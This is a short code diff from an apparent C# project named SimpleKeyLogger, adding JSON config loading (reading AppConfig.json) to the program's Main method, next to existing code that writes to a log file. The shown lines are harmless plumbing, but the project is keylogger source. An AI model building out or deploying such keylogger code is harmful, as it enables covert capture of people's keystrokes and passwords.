@@ -1,6 +1,9 @@
-﻿using SimpleKeyLogger.FileAdapters;
+﻿using Newtonsoft.Json;
+using SimpleKeyLogger.FileAdapters;
+using SimpleKeyLogger.Models;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -17,6 +20,8 @@ namespace SimpleKeyLogger
 
         static void Main(string[] args)
         {
+            string configText = File.ReadAllText("AppConfig.json");
+            AppConfig config = JsonConvert.DeserializeObject<AppConfig>(configText);
             bool endOfProgram = false;
             TextFileAdapter file = new TextFileAdapter("log", "");
             List<int> charSet = new List<int>();
